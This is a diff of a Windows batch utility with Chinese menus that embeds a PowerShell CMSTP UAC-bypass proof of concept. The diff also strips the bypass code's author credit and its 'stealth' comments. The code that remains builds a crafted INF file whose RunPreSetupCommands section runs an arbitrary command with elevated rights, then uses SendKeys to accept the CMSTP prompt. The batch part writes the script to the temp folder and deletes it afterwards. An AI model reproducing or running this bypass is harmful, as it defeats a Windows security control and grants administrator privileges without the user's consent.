@@ -49,7 +49,7 @@ setlocal
 set "dosqssj=!time!"
 chcp 936>nul
 set ver=20250101
-set versize=168570
+set versize=168337
 set fy1=___
 set xz0=0
 set "pause=set /p =按任意键返回菜单<nul&pause>nul"
@@ -5401,12 +5401,7 @@ call :out 1
 del /f /q "%temp%\su.bat";"%Temp%\CMSTP.inf"
 exit 0
 #su#
-# UAC Bypass poc using SendKeys
-# Version 1.0
-# Author: Oddvar Moe
-# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/
-# Todo: Hide window on screen for stealth
-# Todo: Make script edit the INF file for command to inject...
+#UAC Bypass poc using SendKeys
 Function Set-INFFile {
 	[CmdletBinding()]
 	Param (
@@ -5419,22 +5414,17 @@ Function Set-INFFile {
 [version]
 Signature=`$chicago`$
 AdvancedINF=2.5
-
 [DefaultInstall]
 CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
-
 [RunPreSetupCommandsSection]
-; Commands Here will be run Before Setup Begins to install
+;Commands Here will be run Before Setup Begins to install
 $CommandToExecute
 taskkill /IM cmstp.exe /F
-
 [CustInstDestSectionAllUsers]
 49000,49001=AllUSer_LDIDSection, 7
-
 [AllUSer_LDIDSection]
 "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
-
 [Strings]
 ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
@@ -5482,7 +5472,7 @@ Function Set-WindowActive {
 		}
 		$hash = @{
 			Process = $Name
-			Hwnd    = $hwnd
+			Hwnd	= $hwnd
 		}
 		New-Object -TypeName PsObject -Property $hash
 	}
